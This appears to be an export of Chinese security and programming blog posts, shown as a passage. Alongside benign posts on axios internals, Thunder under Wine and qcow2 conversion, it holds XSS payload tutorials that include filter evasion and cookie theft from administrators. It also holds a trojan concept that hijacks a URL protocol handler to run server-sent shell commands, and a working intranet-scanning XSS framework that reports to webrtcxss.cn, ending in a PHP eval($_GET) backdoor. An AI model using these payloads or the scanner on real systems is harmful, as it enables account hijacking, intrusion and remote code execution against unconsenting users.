$_GET[&apos;xss_input_value&apos;]; if(isset($xss)){ echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;; }else{ echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;; } ?&gt; &lt;/center&gt; &lt;/body&gt;&lt;/html&gt; 下面是代码的页面 这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入&lt;script&gt;alert('xss')&lt;/script&gt;来测试) 明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码 我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在&lt;script&gt;alert('xss')&lt;/script&gt;前面加个&quot;&gt;来闭合input标签。所以应该得到的结果为 成功弹窗了，我们在看看这时的页面 看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码 这时可以看到我们构造的代码里面有两个&quot;&gt;，第一个”&gt;是为了闭合input标签，所以第二个&quot;&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？ 这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。 还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成&quot; onclick=&quot;alert('xss') 这时，我们在来试试，页面会发生什么样的变化吧。 没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行alert('xss')代码。我们来试试看 当我点击后，就出现了弹窗，这时我们来看看源代码把 第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成 onmousemove 当鼠标移动就触发 onload 当页面加载完成后触发 还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。 别以为就这样结束了，还有一类环境不能用上述的方法， 那就是如果在&lt;textarea&gt;标签里呢？！或者其他优先级比script高的呢？ 就下面这样 这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入&lt;/textarea&gt;&lt;script&gt;alert('xss')&lt;/script&gt;就可以实现弹窗了。 0×04 过滤的解决办法: 假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写 1234&lt;img scr=1 onerror=alert('xss')&gt; 当找不到图片名为1的文件时，执行alert('xss')&lt;a href=javascrip:alert('xss')&gt;s&lt;/a&gt; 点击s时运行alert('xss')&lt;iframe src=javascript:alert('xss');height=0 width=0 /&gt;&lt;iframe&gt; 利用iframe的scr来弹窗&lt;img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")&gt;&lt;/img&gt; 过滤了alert来执行弹窗 等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…) 0×05 xss的利用: 说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。 这时我们要插入js代码了，怎么插呢？ 你可以这样 1&lt;script scr=\"js_url\"&gt;&lt;/script&gt; 也可以这样1&lt;img src=x onerror=appendChild(createElement('script')).src='js_url' /&gt; 各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？ Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。 比如我们在网站的留言区输入&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。 至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/05/30/principle-analysis-and-anatomy-of-xss/"},{"title":"在debian下如何使用迅雷登陆账号","text":"前言： 今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源 正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。 下载迅雷： 可能是我们这边地区的问题，在迅雷官网下载的迅雷都很慢，于是使用“百度管家”下载。fuck me down XunLei 环境搭建： 就是用wine来使用exe程序，这里不介绍，请自己百度 安装注意事项： 不要使用sudo wine Thunder_9.0.12.332_baidu.exe，请使用wine Thunder_9.0.12.332_baidu.exe，不然你的迅雷会被安装到root用户下 如何启动 迅雷安装好后，会在你的桌面放一个快捷方式。如果没有，请像我这么做： cd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Thunder\\ Network/Thunder9/Program/ wine Thunder.exe 然后，他就启动成功了。 就像这样： 为什么会出现黑色的框框呢？ 黑色的框框是个浏览器，迅雷自带的XBrowser浏览器。个人猜测是因为dll的问题，等我有时间的时候，我去找台window电脑，看一下这个浏览器以来上面dll。这个浏览器无所谓的，没有他照样下载。 登陆 重点来了，点击登陆时，会让你输入账号密码 但是你会发现，你输入的字符串没有显示，不用慌，就像linux终端输入密码时一样，其实你输入了，只是不可见而已。然后就可以登陆了。但是有时候会出现让你填写验证码的框。 于是你会蛋疼的发现，验证码去吃屎了。所以现在我们就来解决这个问题。先想象一下验证码的特性。当我点击“看不清，换一张”的时候，那么一定会发送一个数据包。然后返回新的验证码数据包，我们只需要截取这个数据就行了。这里我使用wireshark来进行抓包。 debian安装wireshark，需要添加kali的源，然后sudo apt-get update&amp;&amp;sudo apt-get install wireshark就行了。记得使用sudo wireshark来运行 我这里的网卡是wlan0，有可能不一样，选一个你觉得是对的就行了，如果你还是不知道。对不起，请你出去，本节课不准提问。 然后你就看到比粪池里的屎还多的数据包 这个时候我们在Filter里填写http&amp;&amp; http contains &quot;image/jpeg&quot; 然后打开迅雷，登陆。当出现验证码验证的时候再次切换到wireshark看就行了。 选中（就是让它的背景色变成蓝色，单击） 然后File-&gt;Export Objects-&gt;HTTP 选中地址是verify2.xunlei.com且Content Type为image/jpeg选中后，点击另存为xx.jpg。 拿验证码登陆就行了。","link":"/2016/08/24/how-to-use-thunder-login-account-under-debian/"},{"title":"分析axios源码来找出无法使用all和spread等方法的原因","text":"前言如果你在使用axios的时候，是使用axios.create({})方法来进行创建axios的，那么你会发现你无法使用all、spread、Cancel、CancelToken、isCancel方法。 我上网查了相关的问题，axios维护者们都是让你重新引入axios package来进行完成任务。我不喜欢这种方法，因为重新引入的话，那我的axios配置就会丢失，需要重新配置一遍，太过麻烦。 因为我们项目很多时候，不想使用默认的配置，想使用自定义设置的axios实例。比如设置基础URL和超时时间： 1234let newAxios = axios.create({ baseURL: 'https://www.google.com.hk', timeout: 1000}) 设置完后，使用newAxios.post来完成自己的需求，当然，如果你只使用get、post、put等基础的方法，是没有问题的。但是如果你使用all、spread、Cancel、CancelToken、isCancel方法，将会告诉你，方法不存在。 现在，让我们看一下axios源码是如何实现的，为什么使用axios.create方法后，就无法使用all、spread等方法。 正文我们先打开axios源码目录下的lib/axios.js文件。这个文件就是Axios入口处。也是create函数所在的地方。我们现在来看看create的源代码： 123axios.create = function create(instanceConfig) { return createInstance(mergeConfig(axios.defaults, instanceConfig));}; 我们先逐步解读。看到mergeConfig方法，大家就能从字面上理解了。这是一个合并配置的方法。就是把我们配置与默认配置进行合并，把我们的配置覆盖默认的配置。合并配置的代码，这里就不细说了，有兴趣的可以去mergeConfig看下。所以现在的代码变成了这样： 12345678910axios.create = function create(instanceConfig) { return createInstance({ baseURL: 'https://www.google.com.hk', timeout: 1000, xsrfCookieName: 'XSRF-TOKEN', xsrfHeaderName: 'X-XSRF-TOKEN', maxContentLength: -1, /* 等等 */ });}; 现在看是不是就有点清晰了。现在我们看到还剩一个函数createInstance，现在让我们去看一下: 123456789101112function createInstance(defaultConfig) { var context = new Axios(defaultConfig); var instance = bind(Axios.prototype.request, context); // Copy axios.prototype to instance utils.extend(instance, Axios.prototype, context); // Copy context to instance utils.extend(instance, context); return instance;} context变量内容是axios实例代码。我们来看下，里面大致长啥样: 1234567891011121314151617181920212223242526272829function Axios(instanceConfig) { this.defaults = instanceConfig; this.interceptors = { request: new InterceptorManager(), response: new InterceptorManager() };}// Provide aliases for supported request methodsutils.forEach(['delete', 'get', 'head', 'options'], function forEachMethodNoData(method) { /*eslint func-names:0*/ Axios.prototype[method] = function(url, config) { return this.request(utils.merge(config || {}, { method: method, url: url })); };});utils.forEach(['post', 'put', 'patch'], function forEachMethodWithData(method) { /*eslint func-names:0*/ Axios.prototype[method] = function(url, data, config) { return this.request(utils.merge(config || {}, { method: method, url: url, data: data })); };}); 不用细看，我们只需要知道，实例Axios后，context变量里的原型链上有request delete get head options post put patch方法，自身有request interceptors对象。 现在，让我们看下下面的bind和extend方法: 1234567var instance = bind(Axios.prototype.request, context);// Copy axios.prototype to instanceutils.extend(instance, Axios.prototype, context);// Copy context to instanceutils.extend(instance, context); 第一个bind函数，是让Axios.prototype.request函数里的this指向context变量。 后面两个extend方法，是把第二参数的可枚举对象复制到第一个参数中，也就是instance变量里。 我们从第一个bind方法开始，现在instance变量里有一个request方法。 然后第二个extend方法，把Axios.prototype里的方法复制到instance变量里。现在instance变量里有request delete get head options post put patch方法。 最后第三个extend方法，把context里的方法复制到instance变量里。现在变量里有request delete get head options post put patch interceptors defaults。 然后就没了，create方法直接返回instance变量。是不是根本没有看到all、spread等方法。这也就是为什么使用create方法后，无法使用这些方法。那么这些方法在哪呢？还是在lib/axios.js文件里: 123456789101112131415// Expose Cancel &amp; CancelTokenaxios.Cancel = require('./cancel/Cancel');axios.CancelToken = require('./cancel/CancelToken');axios.isCancel = require('./cancel/isCancel');// Expose all/spreadaxios.all = function all(promises) { return Promise.all(promises);};axios.spread = require('./helpers/spread');module.exports = axios;// Allow use of default import syntax in TypeScriptmodule.exports.default = axios; 可以看到，这里是把这些方法直接赋值在axios方法上，然后就直接暴露出去了。所以当我们使用axios可以使用all、spread等方法。但是使用axios.create就无法使用all、spread、Cancel、CancelToken、isCancel方法。 解决方案如果能改axios源码的话，那可以把lib/axios.js改成如下，就行了: 12345678910111213141516171819202122function createInstance(defaultConfig) { var context = new Axios(defaultConfig); var instance = bind(Axios.prototype.request, context); // Copy axios.prototype to instance utils.extend(instance, Axios.prototype, context); // Copy context to instance utils.extend(instance, context); utils.extend(instance, { Cancel: require('./cancel/Cancel'), CancelToken: require('./cancel/CancelToken'), isCancel: require('./cancel/isCancel'), all: function all(promises) { return Promise.all(promises); }, spread: require('./helpers/spread') }, context); return instance;} 但是，这当然不可能啦。所以，我们需要在不改源代码的情况下，去实现。 有一个暴力的解决方案，不过我挺喜欢的: 1234567891011let axios = require('axios');const http = axios.create({ baseURL: 'https://www.google.com.hk'})/* eslint-disable no-proto */http.__proto__ = axios/* eslint-enable */module.exports = axios 是不是很简单，一行代码解决问题。这里之所以要加上注释，因为在eslint里是不允许对__proto__进行重新赋值的。 作者信息： Author: Black-Hole Blog: http://bugs.cc/ github: https://github.com/BlackHole1/ Twitter: https://twitter.com/Free_BlackHole Email: 158blackhole@gmail.com","link":"/2018/04/14/analyz-the-axios-source-to-find-out-why-you-cant-use-all-and-spread-methods/"},{"title":"在vmware里运行qcow2镜像","text":"前言因为一些原因，需要在自己的笔记本上运行qcow2镜像。做个OpenStack平台吧，系统配置吃不消。想试一下能不能在vmware里直接跑qcow2镜像。网上的答案都是使用qemu-img工具进行转化，但是都后面也就没有说明了。于是自己折腾了一下，把过程记录一下。 准备需要先下载qemu-img工具，因为我是在windows64位上，所以就下载了win64的镜像，工具安装好后，最好在环境变量里的PATH里加入下一安装目录，方便后面的操作 Vmware虚拟机、qcow2原始镜像包就不说了，必备的。 流程首先使用qemu-img工具，把qcow2的镜像转化成vmdk格式的： 1$ qemu-img convert -f qcow2 CentOS_7.2_x86_64_XD.qcow2 -O vmdk Centos.vmdk 然后会在根目录出现Centos.vmdk镜像，但是无法导入，因为没有vmx文件。导入到Vmware里会报错。 所以，我们先使用VMware建立一个空的虚拟机，系统因你的qcow2进行选择，因为我是Centos7。我这里选择的是Centos 7 64位系统。 创建好了之后，进入Virtual Machines目录下的你刚刚创建虚拟机的目录，把vmdk文件删除，用之间qemu-img转化后的文件，覆盖过去，启动Vmware就成功了。 下面是演示视频：","link":"/2018/01/23/run-qcow2-image-in-vmware/"},{"title":"基于URLProtocol攻击的一些想法","text":"浏览器调起本地应用的原理是URLProtocol技术，详情可以在 http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html http://blog.csdn.net/zssureqh/article/details/25828683 里查看。 其中 在注册表的 [HKEY_CLASSES_ROOT]主键下，我们可以看到很多的URLProtocol。比如阿里旺旺的： 而阿里旺旺在网页端的和我联系按钮，是跳转到https://amos.alicdn.com/getcid.aw?v=3&amp;groupid=0&amp;s=1&amp;charset=utf-8&amp;uid=淘宝店铺名&amp;site=cntaobao&amp;groupid=0&amp;s=1&amp;fromid=cntaobao淘宝用户名链接的，而这个页面调用了下面的javascript代码： 123456789101112131415161718192021222324!function() { var a = window, b = function() { try { window.open(\"\", \"_top\"), a.opener = null, a.close() } catch(b) {} }, c = function() { a.location.href = \"aliim:sendmsg?touid=\" + a.site + a.touid + \"&amp;site=\" + a.site + \"&amp;status=1\", setTimeout(function() { b() }, 6e3) }; a.isInstalled ? a.isInstalled(function(b) { if (b) c(); else { var d = confirm(\"\\u68c0\\u6d4b\\u5230\\u4f60\\u672a\\u5b89\\u88c5\\u963f\\u91cc\\u65fa\\u65fa\\u5ba2\\u6237\\u7aef,\\u662f\\u5426\\u8981\\u8df3\\u8f6c\\u5230\\u5b98\\u7f51\\u4e0b\\u8f7d?\"); d === !0 &amp;&amp; (a.location.href = \"https://wangwang.taobao.com\") } }) : c()} (); 其中最核心的代码就是a.location.href = &quot;aliim:sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;代码，而这段代码的aliim就是在注册表的 [HKEY_CLASSES_ROOT]主键下的阿里旺旺主键名。 在上面的图中，我们可以看到当打开时，调用了&quot;D:\\Program Files (x86)\\AliWangWang\\8.60.03C\\wwcmd.exe&quot; %1命令，wwcmd.exe就是阿里旺旺处理网页端信息的API接口，当处理成功时，就会调起回话窗口。%1就是sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;这段参数。让我们替换下WWCmd.exe。看下是如何传递参数的： 1234567891011#include&lt;stdio.h&gt;int main(int argc,char **argv) { FILE *fp = fopen(\"c:/123.txt\",\"w+\"); if(NULL == fp) return -1; while(argc--&gt;0){ fputs(*++argv,fp); fputs(\" \",fp); } return 0; } 这段C语言代码是会把后面的参数另存为c盘下的123.txt文件，替换掉WWCmd.exe后，点击和我联系，C盘下存在了一个123.txt文件 发现，把aliim:也传递进去了，按照这个请求的话，我们可以构造一个exe程序，来进行接收参数了。个人能力有限，说说大体的思路吧。 exe程序替换掉原有的WWCmd.exe程序，然后来生成特定的插件，植入到浏览器里，然后用户每打开一个网站都会从服务器端接收一个特定的base64编码后的shell代码。然后执行aliim:cmd=服务端的base64，然后运行。当参数为sendmsg时，调起阿里旺旺，当为cmd时执行代码。这样的话，木马的隐藏及唤醒条件都达到了。同理迅雷下载等也都可以。 好处是在哪呢，一般来说浏览器调起阿里旺旺、迅雷等应用都会弹窗，但是一般用户都会点击 不在提示。这样的话，目标就打成了。 这只是一个思路，不太成熟。欢迎大家补充。","link":"/2017/03/26/some-ideas-based-on-URLProtocol-attacks/"},{"title":"浏览器插件的攻击向量","text":"0x01 前言： 很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。 直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/wooyun-2014-076685 这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。 而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。 0x02构架： 代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：12345678var onlyString = \"abc\";var ipList = [];var survivalIpLIst = [];var deathIpLIst = [];var sendsurvivalIp = \"http://webrtcxss.cn/Api/survivalIp\";var snedIteratesIpUrl = \"http://webrtcxss.cn/Api/survivalPortIp\";var snedIteratesCmsIpUrl = \"http://webrtcxss.cn/Api/survivalCmsIp\";var sendExistenceVul = \"http://webrtcxss.cn/Api/existenceVul\"; onlyString ： 唯一字符串，用于让服务器识别当前发送的请求是哪一个项目，真实代码是不会写成abc的，会使用md5(date(‘Y-m-d H:i:s’))来生成hash。 ipList ： 数组变量用来储存webrtc获取的内网IP地址。 survivalIpLIst ： 数组对象用于存放开放80端口的IP地址 deathIpLIst ： 数组对象用于存放不存在80端口的IP，用于判断 sendsurvivalIp ： 发送当前内网IP的信息到服务端 snedIteratesIpUrl ： 从服务端反馈的cms路径对当前存在80端口的IP进行判断，看现有存活的IP地址是否可以在服务端里找到所匹配的CMS信息 snedIteratesCmsIpUrl ： 用于在已匹配到的cms信息里，从服务端里验证这个cms是否存在我们在服务端里所保存的getshell漏洞 sendExistenceVul ： 已确定漏洞，发送到服务端 之前在0x01前言里说到，这里我将会使用其他办法“绕过浏览器的同源策略”。现在我就来说说如何构架、整段代码的构架把： WebRTC获取到内网IP-&gt;遍历内网存在80端口的IP地址-&gt;检测开放80端口IP属于哪一种CMS类型-&gt;利用getshell生成js文件-&gt;是否存在js文件-&gt;存在JS文件-&gt;发送到服务端，漏洞存在-&gt; -&gt;不存在JS文件-&gt;漏洞不存在，结束。详情请移步到：https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec 0x03获取内网的IP信息： 详情请移步到：https://webrtc.org/faq/#what-is-webrtc因为WebRTC让JavaScript具有了一定的底层操作方法，而由于WebRTC的特殊性，让我们可以使用JavaScript来获取到内网IP。目前WebRTC支持的平台有：Chrome、Firefox、Opera、Android、IOS。实际测试的时候maxthon也是支持的（此处有伏笔）。WebRTC获取内网IP这段代码网上是可以找到的，而在这里需要修改一下。方便其他代码容易调用。然后就是webrtc的代码了：123456789101112131415161718192021222324252627282930313233var webrtcxss = { webrtc : function(callback){ var ip_dups = {}; var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; var mediaConstraints = { optional: [{RtpDataChannels: true}] }; var servers = undefined; if(window.webkitRTCPeerConnection){ servers = {iceServers: []}; } var pc = new RTCPeerConnection(servers, mediaConstraints); pc.onicecandidate = function(ice){ if(ice.candidate){ var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/; var ip_addr = ip_regex.exec(ice.candidate.candidate)[1]; if(ip_dups[ip_addr] === undefined) callback(ip_addr); ip_dups[ip_addr] = true; } }; pc.createDataChannel(\"\"); pc.createOffer(function(result){ pc.setLocalDescription(result, function(){}); }); }, getIp : function(){ this.webrtc(function(ip){ ipList.push(ip); }); }}webrtcxss.getIp(); 现在我们来打印一下看看： 已经获取到了我当前主机的IP地址了。 0x04检测内网中开启了80端口的IP： 上一节的结尾可以看到webrtcxss.getIp();已经调用了WebRTC来获取到内网的IP信息，IP保存在ipList数组变量里。这里就要检测内网中所有开放80端口的IP了。这里我写了一个函数来把这一步放到函数里：1234567891011121314151617181920212223242526272829function iteratesIp(){ stage(1) ipAjax = new XMLHttpRequest(); ipAjax.open('POST', sendsurvivalIp, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('survivalip='+ ipList.join(\"-\") + '&amp;onlystring=' + onlyString); for(var i = 0;i &lt; ipList.length;i++){ incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++){ var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); } }}setTimeout(\"iteratesIp()\",20000);(function(){ if(deathIpLIst.length + survivalIpLIst.length == 254){ snedIteratesIpData(survivalIpLIst); }else{ setTimeout(arguments.callee,5000); }})(); 至于其中的stage(1)是我自己写的一个函数，用于实时向服务端发送当前最新的运行情况，我们放到最后再说。1234ipAjax = new XMLHttpRequest();ipAjax.open('POST', sendsurvivalIp, false);ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ipAjax.send('survivalip='+ ipList.join(\"-\") + '&amp;onlystring=' + onlyString); 这段代码是把当前获取到的内网IP发送到服务端，至于为什么要在ipList后面加上join(“-“)函数是因为WebRTC有时会把获取网关、VM虚拟机的IP也获取上来。1234567891011121314for(var i = 0;i &lt; ipList.length;i++){ incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++){ var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); }} 这段代码是遍历所有内网主机80端口的。我们来实际看下把： 后面的.104被我们去掉了。然后利用for循环来遍历192.168.1.1~192.168.1.254现在我们来运行1234567891011121314for(var i = 0;i &lt; ipList.length;i++){ incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++){ var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); }} 这段代码： 这是控制台的效果，我们来看下DOM发生了哪些变化把： 这里我使用的是http://192.168.1.xxx/favicon.ico来判断内网哪些IP开启了80端口，并且上面运行着站点。其中的onerror=&quot;javascript:deathIpLIst.push('192.168.1.xxx')&quot;是如果此IP没有开启80端口，或者开启了80端口，但是没有运行站点的话，就调用把当前的IP地址push到deathIpLIst变量里。如果存在的话就push到survivalIpLIst变量里，也就是这段代码：onload=&quot;javascript:survivalIpLIst.push('192.168.1.1')&quot;至于为什么要这么做呢，这里就要涉及一个坑了。浏览器是不会你加载了哪些图片就立刻告诉你哪些图片是可以访问，哪些图片是不能访问的，浏览器需要一个缓冲的时间。检测同一网段里254个主机是否存在favicon.ico，大约需要花费550000ms===550s约等于2.16535s/IP。也就是9.16多分钟。也就是全部检测完需要等待9.16分钟。这也是没办法的事，改变不了。至于下面为什么要使用setTimeout(&quot;iteratesIp()&quot;,20000);来延迟20秒执行呢，因为WebRTC获取IP需要一定的时间，其实几秒钟就好了。但是为了提高容错率我把时间提高到20秒的时间，如果你嫌慢，可以在文章结尾下载源代码，修改。还有一段代码是这样的：1234567(function(){ if(deathIpLIst.length + survivalIpLIst.length == 254){ snedIteratesIpData(survivalIpLIst); }else{ setTimeout(arguments.callee,5000); }})(); 这就是为什么我之前要把80端口不存在的IP放到一个数组变量里，存在80端口的IP放到一个数组变量里。因为我不确定他们什么时候好，之前说的9.1分钟，只是一个大概时间，因电脑配置、内网通讯速度等其他的原因可能会提前，也可能会更慢。我无法做出保证。所以写了一段代码。下面我来说说这段代码的意思：123(function(){ /*coding*/})(); 是一段匿名函数，当代码运行到此处时会立刻执行此函数。函数里面首先是判断deathIpLIst.length + survivalIpLIst.length是否等于254。如果等于254则调用snedIteratesIpData函数，并把开启80端口并运行站点的IP作为参数发送过去。如果不等于说明浏览器还没有把所有的图片都给判断好。进入else分之。setTimeout(arguments.callee,5000);是延迟5秒钟运行arguments.callee。而arguments.callee的意思是当前函数。我们来实际看下： console.log打印了当前的函数，当然你也可以使用setTimeout(当前的函数名(),5000);来达到此效果，但是此方法对于匿名函数没有用。因为匿名函数是不存在名称的。如果学了递归的朋友们，应该会很好理解。说通俗点就是：每隔5秒钟运行此函数，直到所有img标签全部判断完成，才进行下一步的操作。 0x05确认内网存活主机的CMS信息： 上一节我们说到闭包里的if条件里true执行的snedIteratesIpData函数，现在我们就来说说这个函数里面是什么内容：1234567891011121314151617181920212223242526function snedIteratesIpData(ip){ if(deathIpLIst.length == 254){ return false; } stage(2) ip = ip.join(\"-\") ipAjax = new XMLHttpRequest(); ipAjax.onreadystatechange = function(){ if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200){ var cmsPath = JSON.parse(ipAjax.responseText).path; for(var key in cmsPath){ for(var i = 0;i &lt; survivalIpLIst.length;i++){ var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\" + survivalIpLIst[i] + cmsPath[key]); scriptTag.setAttribute(\"data-ipadder\",survivalIpLIst[i]); scriptTag.setAttribute(\"data-cmsinfo\",key); scriptTag.setAttribute(\"onload\",\"javascript:vulnerabilityIpList(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); } } } } ipAjax.open('POST', snedIteratesIpUrl, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('iplist='+ip+'&amp;onlystring='+onlyString);} 为什么要在函数开始前写上if函数呢，因为在上一节中的闭包里存在一个bug。就是当所有内网IP中都没有开放80端口且不存在站点的情况下，deathIpLIst.length会为254。而survivalIpLIst.length会为0。那deathIpLIst.length + survivalIpLIst.length == 254的条件是为true的。为了避免此bug的发生，我们在snedIteratesIpData函数里加入123if(deathIpLIst.length == 254){ return false;} 当deathIpLIst.length等于254的时候，返回false。不再向下执行。因为所有代码的构架就是A调用B，C调用A，D调用C。当C返回false的时候，D是不会执行的。从上面的代码可以看到，返回false后。下面的代码都不会运行的。现在我们来看下ip = ip.join(&quot;-&quot;)这条代码的意思，是当内网中存在两条（包括两条）以上的IP地址时，使用join函数，传给服务端。方便服务端的接受及查看。服务端的反馈就像下面这样： 面来说说ajax请求的代码：12345678910111213141516171819ipAjax = new XMLHttpRequest();ipAjax.onreadystatechange = function(){ if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200){ var cmsPath = JSON.parse(ipAjax.responseText).path; for(var key in cmsPath){ for(var i = 0;i &lt; survivalIpLIst.length;i++){ var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\" + survivalIpLIst[i] + cmsPath[key]); scriptTag.setAttribute(\"data-ipadder\",survivalIpLIst[i]); scriptTag.setAttribute(\"data-cmsinfo\",key); scriptTag.setAttribute(\"onload\",\"javascript:vulnerabilityIpList(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); } } }}ipAjax.open('POST', snedIteratesIpUrl, false);ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ipAjax.send('iplist='+ip+'&amp;onlystring='+onlyString); 发送内网中开放80端口且具有站点的ip地址，并同时发送唯一标识符。用于服务端验证。服务端接受后，发送json数据，服务端代码如下：1234$this-&gt;ajaxReturn(array( \"typeMsg\" =&gt; \"success\", \"path\" =&gt; $pathInfo,)); 然后使用if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)来判断是否发送成功，成功后，把json里的path数据赋值cmsPath变量。用于后面的代码调用。首先进入for循环，cmsPath[‘key’]为当前的cms路径。然后再来套一个for循环，survivalIpLIst[i]为当前循环的IP地址。接下来就是建立一个script标签的DOM元素，其中的data-ipadder、data-cmsinfo是为了让后面的代码方便调用。onload = &quot; javascript:vulnerabilityIpList(this)&quot;是当这个地址存在的时候，调用的一个函数，下一节会说到。现在先让我们看看数据库在的cmsPath是什么样的把： 默认就这4个，更多的路径可以自行加入。为了方便测试，我在我家中的另一台电脑上部署了代码，只有index.php、/static/bbcode.js、vul/heihei.php、favicon.ico这几个文件。而在heihei.php文件里代码如下：12&lt;?php eval($_GET['a']); 